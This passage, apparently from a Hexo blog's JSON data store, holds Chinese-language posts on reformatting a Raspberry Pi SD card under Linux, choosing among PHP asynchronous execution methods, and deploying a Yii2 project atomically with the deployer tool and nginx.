bytes=1024-2048</code>实现了加速下载。</p>\n"},{"title":"linux下SD卡无法挂载","id":"147","date":"2015-07-30T14:50:41.000Z","_content":"\n这两天用SD卡给树莓派制作系统，但一直没成功，插入SD卡灯也不闪烁，总是亮着。\n\n而烧录好镜像后的SD卡，无法再挂载在linux上了，我的系统是Fedora22，能听到插入的系统提示音，但无法看到SD卡的文件系统。所以只好格式化SD卡：\n\n1\\. 找到SD卡的设备：\n```\nsudo fdisk -l\n```\n按照容量我的SD卡在 **/dev/sdb**\n\n2\\. 格式化为FAT32类型，这是所有系统通用的\n```\nsudo mkdosfs -F 32 -I /dev/sdb\n```\n完成后重新插拔即可看到SD卡的文件系统。\n\n接下来又反复折腾。。。","source":"_posts/linux-e4-b8-8bsd-e5-8d-a1-e6-97-a0-e6-b3-95-e6-8c-82-e8-bd-bd.md","raw":"---\ntitle: linux下SD卡无法挂载\nid: 147\ncategories:\n  - linux\ndate: 2015-07-30 22:50:41\ntags:\n---\n\n这两天用SD卡给树莓派制作系统，但一直没成功，插入SD卡灯也不闪烁，总是亮着。\n\n而烧录好镜像后的SD卡，无法再挂载在linux上了，我的系统是Fedora22，能听到插入的系统提示音，但无法看到SD卡的文件系统。所以只好格式化SD卡：\n\n1\\. 找到SD卡的设备：\n```\nsudo fdisk -l\n```\n按照容量我的SD卡在 **/dev/sdb**\n\n2\\. 格式化为FAT32类型，这是所有系统通用的\n```\nsudo mkdosfs -F 32 -I /dev/sdb\n```\n完成后重新插拔即可看到SD卡的文件系统。\n\n接下来又反复折腾。。。","slug":"linux-e4-b8-8bsd-e5-8d-a1-e6-97-a0-e6-b3-95-e6-8c-82-e8-bd-bd","published":1,"updated":"2018-03-05T12:55:52.930Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhwg002hlzlmcnuq00op","content":"<p>这两天用SD卡给树莓派制作系统，但一直没成功，插入SD卡灯也不闪烁，总是亮着。</p>\n<p>而烧录好镜像后的SD卡，无法再挂载在linux上了，我的系统是Fedora22，能听到插入的系统提示音，但无法看到SD卡的文件系统。所以只好格式化SD卡：</p>\n<p>1. 找到SD卡的设备：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo fdisk -l</span><br></pre></td></tr></table></figure></p>\n<p>按照容量我的SD卡在 <strong>/dev/sdb</strong></p>\n<p>2. 格式化为FAT32类型，这是所有系统通用的<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mkdosfs -F 32 -I /dev/sdb</span><br></pre></td></tr></table></figure></p>\n<p>完成后重新插拔即可看到SD卡的文件系统。</p>\n<p>接下来又反复折腾。。。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>这两天用SD卡给树莓派制作系统，但一直没成功，插入SD卡灯也不闪烁，总是亮着。</p>\n<p>而烧录好镜像后的SD卡，无法再挂载在linux上了，我的系统是Fedora22，能听到插入的系统提示音，但无法看到SD卡的文件系统。所以只好格式化SD卡：</p>\n<p>1. 找到SD卡的设备：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo fdisk -l</span><br></pre></td></tr></table></figure></p>\n<p>按照容量我的SD卡在 <strong>/dev/sdb</strong></p>\n<p>2. 格式化为FAT32类型，这是所有系统通用的<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mkdosfs -F 32 -I /dev/sdb</span><br></pre></td></tr></table></figure></p>\n<p>完成后重新插拔即可看到SD卡的文件系统。</p>\n<p>接下来又反复折腾。。。</p>\n"},{"title":"PHP异步执行方案的总结","id":"65","date":"2015-06-06T10:48:58.000Z","_content":"\n比如有时候需要发送个邮件，又不想阻塞页面时间太长，这个时候就需要以下的一些异步方法：\n\n### fsockopen等\n\n打开另一个专门发送邮件的网页，不去管响应结果．\n\n不过建立HTTP连接，发送请求的时间仍然会阻塞，内网页面还好说\n\n### exec('nohup ... &amp;') 等\n\n借助nohup多进程命令，在新进程里打开另一个本地可执行文件．\n\n这样需要派生两个进程，效率不高．\n\n### pcntl多进程扩展\n\n和上面差不多，好的一点在于只需要派生一个进程，而且发送邮件的代码可以写在一起，不用新创建一个文件．\n\n### pthreads多线程扩展\n\n这个是最好的选择，既不用耗费派生进程时的系统资源，又方便控制．可以应付更复杂的情况，比如交叉执行","source":"_posts/php-e5-bc-82-e6-ad-a5-e6-89-a7-e8-a1-8c-e6-96-b9-e6-a1-88-e7-9a-84-e6-80-bb-e7-bb-93.md","raw":"---\ntitle: PHP异步执行方案的总结\nid: 65\ncategories:\n  - php\ndate: 2015-06-06 18:48:58\ntags:\n---\n\n比如有时候需要发送个邮件，又不想阻塞页面时间太长，这个时候就需要以下的一些异步方法：\n\n### fsockopen等\n\n打开另一个专门发送邮件的网页，不去管响应结果．\n\n不过建立HTTP连接，发送请求的时间仍然会阻塞，内网页面还好说\n\n### exec('nohup ... &amp;') 等\n\n借助nohup多进程命令，在新进程里打开另一个本地可执行文件．\n\n这样需要派生两个进程，效率不高．\n\n### pcntl多进程扩展\n\n和上面差不多，好的一点在于只需要派生一个进程，而且发送邮件的代码可以写在一起，不用新创建一个文件．\n\n### pthreads多线程扩展\n\n这个是最好的选择，既不用耗费派生进程时的系统资源，又方便控制．可以应付更复杂的情况，比如交叉执行","slug":"php-e5-bc-82-e6-ad-a5-e6-89-a7-e8-a1-8c-e6-96-b9-e6-a1-88-e7-9a-84-e6-80-bb-e7-bb-93","published":1,"updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhwi002jlzlmjjvhm4fp","content":"<p>比如有时候需要发送个邮件，又不想阻塞页面时间太长，这个时候就需要以下的一些异步方法：</p>\n<h3 id=\"fsockopen等\"><a href=\"#fsockopen等\" class=\"headerlink\" title=\"fsockopen等\"></a>fsockopen等</h3><p>打开另一个专门发送邮件的网页，不去管响应结果．</p>\n<p>不过建立HTTP连接，发送请求的时间仍然会阻塞，内网页面还好说</p>\n<h3 id=\"exec-‘nohup-…-amp-’-等\"><a href=\"#exec-‘nohup-…-amp-’-等\" class=\"headerlink\" title=\"exec(‘nohup … &amp;’) 等\"></a>exec(‘nohup … &amp;’) 等</h3><p>借助nohup多进程命令，在新进程里打开另一个本地可执行文件．</p>\n<p>这样需要派生两个进程，效率不高．</p>\n<h3 id=\"pcntl多进程扩展\"><a href=\"#pcntl多进程扩展\" class=\"headerlink\" title=\"pcntl多进程扩展\"></a>pcntl多进程扩展</h3><p>和上面差不多，好的一点在于只需要派生一个进程，而且发送邮件的代码可以写在一起，不用新创建一个文件．</p>\n<h3 id=\"pthreads多线程扩展\"><a href=\"#pthreads多线程扩展\" class=\"headerlink\" title=\"pthreads多线程扩展\"></a>pthreads多线程扩展</h3><p>这个是最好的选择，既不用耗费派生进程时的系统资源，又方便控制．可以应付更复杂的情况，比如交叉执行</p>\n","site":{"data":{}},"excerpt":"","more":"<p>比如有时候需要发送个邮件，又不想阻塞页面时间太长，这个时候就需要以下的一些异步方法：</p>\n<h3 id=\"fsockopen等\"><a href=\"#fsockopen等\" class=\"headerlink\" title=\"fsockopen等\"></a>fsockopen等</h3><p>打开另一个专门发送邮件的网页，不去管响应结果．</p>\n<p>不过建立HTTP连接，发送请求的时间仍然会阻塞，内网页面还好说</p>\n<h3 id=\"exec-‘nohup-…-amp-’-等\"><a href=\"#exec-‘nohup-…-amp-’-等\" class=\"headerlink\" title=\"exec(‘nohup … &amp;’) 等\"></a>exec(‘nohup … &amp;’) 等</h3><p>借助nohup多进程命令，在新进程里打开另一个本地可执行文件．</p>\n<p>这样需要派生两个进程，效率不高．</p>\n<h3 id=\"pcntl多进程扩展\"><a href=\"#pcntl多进程扩展\" class=\"headerlink\" title=\"pcntl多进程扩展\"></a>pcntl多进程扩展</h3><p>和上面差不多，好的一点在于只需要派生一个进程，而且发送邮件的代码可以写在一起，不用新创建一个文件．</p>\n<h3 id=\"pthreads多线程扩展\"><a href=\"#pthreads多线程扩展\" class=\"headerlink\" title=\"pthreads多线程扩展\"></a>pthreads多线程扩展</h3><p>这个是最好的选择，既不用耗费派生进程时的系统资源，又方便控制．可以应付更复杂的情况，比如交叉执行</p>\n"},{"title":"PHP项目部署","id":"96","date":"2015-06-17T16:01:05.000Z","_content":"\n部署项目是一件比较繁琐的事情，不仅要配置目录权限，更新依赖库等，也要考虑到原子性操作，回滚等．而代码部署工具[deployer.org](http://deployer.org)提供了简化这些的方法，可以轻松编写PHP程序指导部署．\n\n### 介绍\n\ndeploy是在客户端调用，它会自己登录到服务器执行相关操作．比如创建目录，重启fpm，只要给它**sudo (NOPASSWORD)**权限就可以．\n\n它的思路是每次部署创建一个新目录，之前的几个版本目录还会保留下来，方便回滚，默认保存5个版本．\n\n再通过软链接，用一个固定的目录比如 **current **指向线上版本，nginx只管读**current**，这样就不用改动网站配置．\n\n### 安装\n\n首先需要安装deployer，将它装在composer global下，方便部署多个项目\n```\n$ composer global require deployer/deployer:^3.0\n```\n程序就安装在 **~/.composer/vendor/bin/dep**\n\n### 编写部署逻辑\n\n我的项目使用的是Yii2框架，它的部署主要分三步：\n\n1.  下载项目源代码\n2.  更新 **composer **库\n3.  调用 **./init** 脚本设置目录权限\ndeployer默认针对的是**symfony**项目的部署，与Yii2有差别．因此我需要禁用它的一些功能，比如目录权限配置，Yii2会自己完成这些配置．\n\n在项目代码根目录下创建一个部署程序\n```\nvi deploy.php\n```\n```\n<?php\n\n// 包含必要的库\nrequire 'recipe/symfony.php';\n\n// 预定的安装目录\n$path = '/srv/www/myproject';\n\n// 要部署到的机器\nserver('prod', 'localhost', 22)\n->user('name') // 登录主机的用户\n->password(null) // 如果是null，会在安装前询问你密码\n->stage('production')\n// 需要先在这台机器上创建这个目录\n->env('deploy_path', $path);\n\n// 指定git仓库的位置，如果是私有的，可以根据HTTP协议设置登录用户\nset('repository', 'https://[username]:[password]@github.com/my/project.git');\n\n// 要执行的部署任务，deploy自带了一些逻辑比如更新代码和依赖库\ntask('deploy', [\n    'deploy:prepare', // 登录服务器\n    'deploy:release', // 创建发布目录\n    'deploy:update_code', // 下载源代码\n    'deploy:vendors', // 更新composer\n]);\n\n// 我们也可以自定义部署的逻辑，比如调用Yii的init脚本初始化目录权限\ntask('init', function() {\n    // {{release_path}} 是deployer定义的变量，指程序部署到的目录位置\n    run(\"{{release_path}}/init --env='Production' --overwrite=All\");\n});\n// 更新线上目录current的源目录指向\ntask('push', function() {\n    // {{deploy_path}} 是指整个项目的位置，等于 $path\n    run(\"ln -sfn {{release_path}} {{deploy_path}}/current\");\n});\n\n// 更新opcache对文件的缓存，因为nginx传入的document_root是虚拟链接，所以不会改变，需要手动清空缓存\ntask('cache', function() {\n    run('/usr/bin/env php -r \"opcache_reset();\"');\n});\n\n// 在自带的部署任务完成后，执行自定义的逻辑\n// 更新yii2目录权限为线上配置\nafter('deploy', 'init');\n// 更新指向线上目录的位置，这里才正式发布了\nafter('deploy', 'push');\n// 更新opcache缓存，否则程序更改不会生效\nafter('deploy', 'cache');\n\n```\n\n#### 目录说明\n\n**/srv/www/myproject**\n\n设定的项目部署位置\n\n**{{release_path}}**\n\n它是为了方便而自动创建的一个软链接目录，总是指向正在部署中的那个目录（**releases** 下）\n\n**{{deploy_path}}/current**\n\n线上目录，它也是一个软链接．不过在部署完成后，它才会更新．因此它是原子性的，不会影响线上访问．\n\n### 开始部署\n\n参数 **deploy** 就是刚才创建的部署程序文件名，**production**就是按线上生产环境部署\n```\n$ ~/.composer/vendor/bin/dep deploy production\n✔ Executing task deploy:prepare\n✔ Executing task deploy:release\n✔ Executing task deploy:update_code\n✔ Executing task deploy:clear_controllers\n✔ Executing task deploy:vendors\n✔ Executing task init\n✔ Executing task push\n✔ Executing task cache\n\n```\n部署后可以看到这样的目录结构\n```\n$ tree -L 2 /srv/www/myproject\n.\n|-- current -> /srv/www/myproject/releases/20150617163027\n|-- release -> /srv/www/myproject/releases/20150617163027\n|-- releases\n|   |-- 20150617160840\n|   |-- 20150617161024\n|   |-- 20150617161702\n|   |-- 20150617162823\n|   `-- 20150617163027\n\n\n```\n\n#### nginx的配置\n\n```\nserver {\n      root /srv/www/myproject/current;\n      ......\n}\n```\n&nbsp;\n\n至此可以实现不影响线上访问，原子性的部署．更多文档参见  [http://deployer.org/docs](http://deployer.org/docs)","source":"_posts/php-e9-a1-b9-e7-9b-ae-e9-83-a8-e7-bd-b2.md","raw":"---\ntitle: PHP项目部署\nid: 96\ncategories:\n  - linux\n  - php\ndate: 2015-06-18 00:01:05\ntags:\n---\n\n部署项目是一件比较繁琐的事情，不仅要配置目录权限，更新依赖库等，也要考虑到原子性操作，回滚等．而代码部署工具[deployer.org](http://deployer.org)提供了简化这些的方法，可以轻松编写PHP程序指导部署．\n\n### 介绍\n\ndeploy是在客户端调用，它会自己登录到服务器执行相关操作．比如创建目录，重启fpm，只要给它**sudo (NOPASSWORD)**权限就可以．\n\n它的思路是每次部署创建一个新目录，之前的几个版本目录还会保留下来，方便回滚，默认保存5个版本．\n\n再通过软链接，用一个固定的目录比如 **current **指向线上版本，nginx只管读**current**，这样就不用改动网站配置．\n\n### 安装\n\n首先需要安装deployer，将它装在composer global下，方便部署多个项目\n```\n$ composer global require deployer/deployer:^3.0\n```\n程序就安装在 **~/.composer/vendor/bin/dep**\n\n### 编写部署逻辑\n\n我的项目使用的是Yii2框架，它的部署主要分三步：\n\n1.  下载项目源代码\n2.  更新 **composer **库\n3.  调用 **./init** 脚本设置目录权限\ndeployer默认针对的是**symfony**项目的部署，与Yii2有差别．因此我需要禁用它的一些功能，比如目录权限配置，Yii2会自己完成这些配置．\n\n在项目代码根目录下创建一个部署程序\n```\nvi deploy.php\n```\n```\n<?php\n\n// 包含必要的库\nrequire 'recipe/symfony.php';\n\n// 预定的安装目录\n$path = '/srv/www/myproject';\n\n// 要部署到的机器\nserver('prod', 'localhost', 22)\n->user('name') // 登录主机的用户\n->password(null) // 如果是null，会在安装前询问你密码\n->stage('production')\n// 需要先在这台机器上创建这个目录\n->env('deploy_path', $path);\n\n// 指定git仓库的位置，如果是私有的，可以根据HTTP协议设置登录用户\nset('repository', 'https://[username]:[password]@github.com/my/project.git');\n\n// 要执行的部署任务，deploy自带了一些逻辑比如更新代码和依赖库\ntask('deploy', [\n    'deploy:prepare', // 登录服务器\n    'deploy:release', // 创建发布目录\n    'deploy:update_code', // 下载源代码\n    'deploy:vendors', // 更新composer\n]);\n\n// 我们也可以自定义部署的逻辑，比如调用Yii的init脚本初始化目录权限\ntask('init', function() {\n    // {{release_path}} 是deployer定义的变量，指程序部署到的目录位置\n    run(\"{{release_path}}/init --env='Production' --overwrite=All\");\n});\n// 更新线上目录current的源目录指向\ntask('push', function() {\n    // {{deploy_path}} 是指整个项目的位置，等于 $path\n    run(\"ln -sfn {{release_path}} {{deploy_path}}/current\");\n});\n\n// 更新opcache对文件的缓存，因为nginx传入的document_root是虚拟链接，所以不会改变，需要手动清空缓存\ntask('cache', function() {\n    run('/usr/bin/env php -r \"opcache_reset();\"');\n});\n\n// 在自带的部署任务完成后，执行自定义的逻辑\n// 更新yii2目录权限为线上配置\nafter('deploy', 'init');\n// 更新指向线上目录的位置，这里才正式发布了\nafter('deploy', 'push');\n// 更新opcache缓存，否则程序更改不会生效\nafter('deploy', 'cache');\n\n```\n\n#### 目录说明\n\n**/srv/www/myproject**\n\n设定的项目部署位置\n\n**{{release_path}}**\n\n它是为了方便而自动创建的一个软链接目录，总是指向正在部署中的那个目录（**releases** 下）\n\n**{{deploy_path}}/current**\n\n线上目录，它也是一个软链接．不过在部署完成后，它才会更新．因此它是原子性的，不会影响线上访问．\n\n### 开始部署\n\n参数 **deploy** 就是刚才创建的部署程序文件名，**production**就是按线上生产环境部署\n```\n$ ~/.composer/vendor/bin/dep deploy production\n✔ Executing task deploy:prepare\n✔ Executing task deploy:release\n✔ Executing task deploy:update_code\n✔ Executing task deploy:clear_controllers\n✔ Executing task deploy:vendors\n✔ Executing task init\n✔ Executing task push\n✔ Executing task cache\n\n```\n部署后可以看到这样的目录结构\n```\n$ tree -L 2 /srv/www/myproject\n.\n|-- current -> /srv/www/myproject/releases/20150617163027\n|-- release -> /srv/www/myproject/releases/20150617163027\n|-- releases\n|   |-- 20150617160840\n|   |-- 20150617161024\n|   |-- 20150617161702\n|   |-- 20150617162823\n|   `-- 20150617163027\n\n\n```\n\n#### nginx的配置\n\n```\nserver {\n      root /srv/www/myproject/current;\n      ......\n}\n```\n&nbsp;\n\n至此可以实现不影响线上访问，原子性的部署．更多文档参见  [http://deployer.org/docs](http://deployer.org/docs)","slug":"php-e9-a1-b9-e7-9b-ae-e9-83-a8-e7-bd-b2","published":1,"updated":"2018-03-05T12:57:51.549Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhwl002llzlme8zwqd19","content":"<p>部署项目是一件比较繁琐的事情，不仅要配置目录权限，更新依赖库等，也要考虑到原子性操作，回滚等．而代码部署工具<a href=\"http://deployer.org\" target=\"_blank\" rel=\"noopener\">deployer.org</a>提供了简化这些的方法，可以轻松编写PHP程序指导部署．</p>\n<h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p>deploy是在客户端调用，它会自己登录到服务器执行相关操作．比如创建目录，重启fpm，只要给它<strong>sudo (NOPASSWORD)</strong>权限就可以．</p>\n<p>它的思路是每次部署创建一个新目录，之前的几个版本目录还会保留下来，方便回滚，默认保存5个版本．</p>\n<p>再通过软链接，用一个固定的目录比如 <strong>current </strong>指向线上版本，nginx只管读<strong>current</strong>，这样就不用改动网站配置．</p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>首先需要安装deployer，将它装在composer global下，方便部署多个项目<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ composer global require deployer/deployer:^3.0</span><br></pre></td></tr></table></figure></p>\n<p>程序就安装在 <strong>~/.composer/vendor/bin/dep</strong></p>\n<h3 id=\"编写部署逻辑\"><a href=\"#编写部署逻辑\" class=\"headerlink\" title=\"编写部署逻辑\"></a>编写部署逻辑</h3><p>我的项目使用的是Yii2框架，它的部署主要分三步：</p>\n<ol>\n<li>下载项目源代码</li>\n<li>更新 <strong>composer </strong>库</li>\n<li>调用 <strong>./init</strong> 脚本设置目录权限<br>deployer默认针对的是<strong>symfony</strong>项目的部署，与Yii2有差别．因此我需要禁用它的一些功能，比如目录权限配置，Yii2会自己完成这些配置．</li>\n</ol>\n<p>在项目代码根目录下创建一个部署程序<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi deploy.php</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">// 包含必要的库</span><br><span class=\"line\">require &apos;recipe/symfony.php&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 预定的安装目录</span><br><span class=\"line\">$path = &apos;/srv/www/myproject&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 要部署到的机器</span><br><span class=\"line\">server(&apos;prod&apos;, &apos;localhost&apos;, 22)</span><br><span class=\"line\">-&gt;user(&apos;name&apos;) // 登录主机的用户</span><br><span class=\"line\">-&gt;password(null) // 如果是null，会在安装前询问你密码</span><br><span class=\"line\">-&gt;stage(&apos;production&apos;)</span><br><span class=\"line\">// 需要先在这台机器上创建这个目录</span><br><span class=\"line\">-&gt;env(&apos;deploy_path&apos;, $path);</span><br><span class=\"line\"></span><br><span class=\"line\">// 指定git仓库的位置，如果是私有的，可以根据HTTP协议设置登录用户</span><br><span class=\"line\">set(&apos;repository&apos;, &apos;https://[username]:[password]@github.com/my/project.git&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">// 要执行的部署任务，deploy自带了一些逻辑比如更新代码和依赖库</span><br><span class=\"line\">task(&apos;deploy&apos;, [</span><br><span class=\"line\">    &apos;deploy:prepare&apos;, // 登录服务器</span><br><span class=\"line\">    &apos;deploy:release&apos;, // 创建发布目录</span><br><span class=\"line\">    &apos;deploy:update_code&apos;, // 下载源代码</span><br><span class=\"line\">    &apos;deploy:vendors&apos;, // 更新composer</span><br><span class=\"line\">]);</span><br><span class=\"line\"></span><br><span class=\"line\">// 我们也可以自定义部署的逻辑，比如调用Yii的init脚本初始化目录权限</span><br><span class=\"line\">task(&apos;init&apos;, function() &#123;</span><br><span class=\"line\">    // &#123;&#123;release_path&#125;&#125; 是deployer定义的变量，指程序部署到的目录位置</span><br><span class=\"line\">    run(&quot;&#123;&#123;release_path&#125;&#125;/init --env=&apos;Production&apos; --overwrite=All&quot;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">// 更新线上目录current的源目录指向</span><br><span class=\"line\">task(&apos;push&apos;, function() &#123;</span><br><span class=\"line\">    // &#123;&#123;deploy_path&#125;&#125; 是指整个项目的位置，等于 $path</span><br><span class=\"line\">    run(&quot;ln -sfn &#123;&#123;release_path&#125;&#125; &#123;&#123;deploy_path&#125;&#125;/current&quot;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">// 更新opcache对文件的缓存，因为nginx传入的document_root是虚拟链接，所以不会改变，需要手动清空缓存</span><br><span class=\"line\">task(&apos;cache&apos;, function() &#123;</span><br><span class=\"line\">    run(&apos;/usr/bin/env php -r &quot;opcache_reset();&quot;&apos;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">// 在自带的部署任务完成后，执行自定义的逻辑</span><br><span class=\"line\">// 更新yii2目录权限为线上配置</span><br><span class=\"line\">after(&apos;deploy&apos;, &apos;init&apos;);</span><br><span class=\"line\">// 更新指向线上目录的位置，这里才正式发布了</span><br><span class=\"line\">after(&apos;deploy&apos;, &apos;push&apos;);</span><br><span class=\"line\">// 更新opcache缓存，否则程序更改不会生效</span><br><span class=\"line\">after(&apos;deploy&apos;, &apos;cache&apos;);</span><br></pre></td></tr></table></figure>\n<h4 id=\"目录说明\"><a href=\"#目录说明\" class=\"headerlink\" title=\"目录说明\"></a>目录说明</h4><p><strong>/srv/www/myproject</strong></p>\n<p>设定的项目部署位置</p>\n<p><strong></strong></p>\n<p>它是为了方便而自动创建的一个软链接目录，总是指向正在部署中的那个目录（<strong>releases</strong> 下）</p>\n<p><strong>/current</strong></p>\n<p>线上目录，它也是一个软链接．不过在部署完成后，它才会更新．因此它是原子性的，不会影响线上访问．</p>\n<h3 id=\"开始部署\"><a href=\"#开始部署\" class=\"headerlink\" title=\"开始部署\"></a>开始部署</h3><p>参数 <strong>deploy</strong> 就是刚才创建的部署程序文件名，<strong>production</strong>就是按线上生产环境部署<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ~/.composer/vendor/bin/dep deploy production</span><br><span class=\"line\">✔ Executing task deploy:prepare</span><br><span class=\"line\">✔ Executing task deploy:release</span><br><span class=\"line\">✔ Executing task deploy:update_code</span><br><span class=\"line\">✔ Executing task deploy:clear_controllers</span><br><span class=\"line\">✔ Executing task deploy:vendors</span><br><span class=\"line\">✔ Executing task init</span><br><span class=\"line\">✔ Executing task push</span><br><span class=\"line\">✔ Executing task cache</span><br></pre></td></tr></table></figure></p>\n<p>部署后可以看到这样的目录结构<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ tree -L 2 /srv/www/myproject</span><br><span class=\"line\">.</span><br><span class=\"line\">|-- current -&gt; /srv/www/myproject/releases/20150617163027</span><br><span class=\"line\">|-- release -&gt; /srv/www/myproject/releases/20150617163027</span><br><span class=\"line\">|-- releases</span><br><span class=\"line\">|   |-- 20150617160840</span><br><span class=\"line\">|   |-- 20150617161024</span><br><span class=\"line\">|   |-- 20150617161702</span><br><span class=\"line\">|   |-- 20150617162823</span><br><span class=\"line\">|   `-- 20150617163027</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"nginx的配置\"><a href=\"#nginx的配置\" class=\"headerlink\" title=\"nginx的配置\"></a>nginx的配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">      root /srv/www/myproject/current;</span><br><span class=\"line\">      ......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>&nbsp;</p>\n<p>至此可以实现不影响线上访问，原子性的部署．更多文档参见  <a href=\"http://deployer.org/docs\" target=\"_blank\" rel=\"noopener\">http://deployer.org/docs</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>部署项目是一件比较繁琐的事情，不仅要配置目录权限，更新依赖库等，也要考虑到原子性操作，回滚等．而代码部署工具<a href=\"http://deployer.org\" target=\"_blank\" rel=\"noopener\">deployer.org</a>提供了简化这些的方法，可以轻松编写PHP程序指导部署．</p>\n<h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p>deploy是在客户端调用，它会自己登录到服务器执行相关操作．比如创建目录，重启fpm，只要给它<strong>sudo (NOPASSWORD)</strong>权限就可以．</p>\n<p>它的思路是每次部署创建一个新目录，之前的几个版本目录还会保留下来，方便回滚，默认保存5个版本．</p>\n<p>再通过软链接，用一个固定的目录比如 <strong>current </strong>指向线上版本，nginx只管读<strong>current</strong>，这样就不用改动网站配置．</p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>首先需要安装deployer，将它装在composer global下，方便部署多个项目<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ composer global require deployer/deployer:^3.0</span><br></pre></td></tr></table></figure></p>\n<p>程序就安装在 <strong>~/.composer/vendor/bin/dep</strong></p>\n<h3 id=\"编写部署逻辑\"><a href=\"#编写部署逻辑\" class=\"headerlink\" title=\"编写部署逻辑\"></a>编写部署逻辑</h3><p>我的项目使用的是Yii2框架，它的部署主要分三步：</p>\n<ol>\n<li>下载项目源代码</li>\n<li>更新 <strong>composer </strong>库</li>\n<li>调用 <strong>./init</strong> 脚本设置目录权限<br>deployer默认针对的是<strong>symfony</strong>项目的部署，与Yii2有差别．因此我需要禁用它的一些功能，比如目录权限配置，Yii2会自己完成这些配置．</li>\n</ol>\n<p>在项目代码根目录下创建一个部署程序<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi deploy.php</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span 